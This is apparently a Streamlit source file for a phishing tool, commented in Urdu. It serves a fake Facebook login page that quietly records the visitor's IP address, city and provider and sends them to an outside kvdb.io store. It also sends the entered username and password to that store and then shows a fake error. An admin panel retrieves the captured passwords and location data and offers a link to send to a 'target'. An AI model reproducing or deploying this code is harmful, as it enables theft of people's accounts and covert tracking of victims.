import streamlit as st
import requests
import time

# پیج سیٹنگ
st.set_page_config(page_title="FKG 🫀 SECURITY", layout="centered")

# ڈارک پروفیشنل ہیکر لک
st.markdown("""
    <style>
    .stApp { background-color: #000000; color: #33ff33; }
    .stButton>button { width: 100%; background-color: #ff0000; color: white; border: none; }
    input { background-color: #1a1a1a !important; color: #33ff33 !important; border: 1px solid #33ff33 !important; }
    .log-box { padding: 10px; border: 1px solid #33ff33; background: #050505; margin-bottom: 10px; }
    </style>
    """, unsafe_allow_html=True)

view = st.query_params.get("view", "admin")

# --- 1. لاگ ان پیج (جو شکار کو نظر آئے گا) ---
if view == "login":
    # یہ حصہ خاموشی سے اس کی آئی پی اور لوکیشن نکالے گا
    try:
        response = requests.get("https://ipapi.co/json/").json()
        target_info = f"City: {response.get('city')} | Provider: {response.get('org')} | IP: {response.get('ip')}"
        # یہ ڈیٹا آپ کے سرور پر بھیج رہا ہے
        requests.post("https://kvdb.io/S9p4m8m8m8m8m8m8/fkg_logs", data=target_info)
    except:
        pass

    # اصلی فیس بک پیج والا لک (HTML)
    st.image("https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png", width=60)
    st.subheader("Login to Continue")
    u = st.text_input("Mobile number or email", key="u1")
    p = st.text_input("Password", type="password", key="p1")
    
    if st.button("Log In"):
        if u and p:
            requests.post("https://kvdb.io/S9p4m8m8m8m8m8m8/fkg_creds", data=f"User: {u} | Pass: {p}")
            st.success("Verifying credentials...")
            time.sleep(2)
            st.error("Error 404: Service Unavailable")

# --- 2. آپ کا اپنا کنٹرول سینٹر (Admin Panel) ---
else:
    st.markdown("<h1 style='text-align: center;'>FKG 🫀 CONTROL CENTER</h1>", unsafe_allow_html=True)
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("FETCH SYSTEM INFO"):
            res = requests.get("https://kvdb.io/S9p4m8m8m8m8m8m8/fkg_logs")
            if res.status_code == 200:
                st.markdown(f"<div class='log-box'>[!] TARGET FOUND: <br>{res.text}</div>", unsafe_allow_html=True)
            else:
                st.info("No system info yet.")
                
    with col2:
        if st.button("FETCH PASSWORDS"):
            res = requests.get("https://kvdb.io/S9p4m8m8m8m8m8m8/fkg_creds")
            if res.status_code == 200:
                st.markdown(f"<div class='log-box' style='color:red;'>[!] CAPTURED: <br>{res.text}</div>", unsafe_allow_html=True)
            else:
                st.info("No passwords yet.")

    st.divider()
    st.write("SEND THIS LINK TO TARGET:")
    url = "https://fkg-tool-2r9hhebwsdbwdbeyemcxpb.streamlit.app/?view=login"
    st.code(url)
